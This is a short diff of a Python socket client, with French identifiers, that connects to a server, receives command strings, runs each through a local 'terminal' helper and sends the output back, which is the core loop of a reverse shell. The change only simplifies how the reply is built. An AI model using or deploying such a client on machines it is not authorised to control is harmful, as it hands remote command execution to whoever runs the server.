@@ -1,4 +1,3 @@
-
 import socket
 import time
 import terminal
@@ -19,24 +18,19 @@ while True:
         print("Connecté au serveur")
         break
 
-
 while True:
     commande_data = s.recv(MAX_DATA_SIZE)
     if not commande_data:
         break
     commande = commande_data.decode()
     print("Commande : ", commande)
-    resultat = terminal.commande_use(commande)
-    reponse = resultat[0]+resultat[1]
 
-    if not reponse or len(reponse) == 0:
-        reponse = " "
+    reponse = terminal.commande_use(commande)
 
     header = str(len(reponse.encode())).zfill(13)
     print("header:", header)
 
     s.sendall(header.encode())
     s.sendall(reponse.encode())
-
 
 s.close()
